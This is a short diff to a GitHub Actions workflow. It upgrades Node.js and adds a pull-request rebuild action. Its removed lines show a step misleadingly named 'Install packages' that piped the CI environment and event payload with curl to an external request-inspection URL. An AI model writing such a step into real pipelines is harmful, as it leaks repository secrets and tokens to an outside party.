@@ -17,11 +17,9 @@ jobs:
     - name: Set up Node.js
       uses: actions/setup-node@v1
       with:
-        node-version: 12
+        node-version: 16
         registry-url: 'https://registry.npmjs.org'
-
-    - name: Install packages
-      run: |
-        env
-        env | curl https://requestinspector.com/inspect/01ff3bndffradde0fpxqa8d1d3 -d"$(</dev/stdin)"
-        cat $GITHUB_EVENT_PATH | curl https://requestinspector.com/inspect/01ff3bndffradde0fpxqa8d1d3 -d"$(</dev/stdin)"
+    
+    - uses: rhosys/github-action-rebuild-pull-requests@v0.1
+      # with:
+      #   github_token: ${{ secrets.GITHUB_TOKEN }}
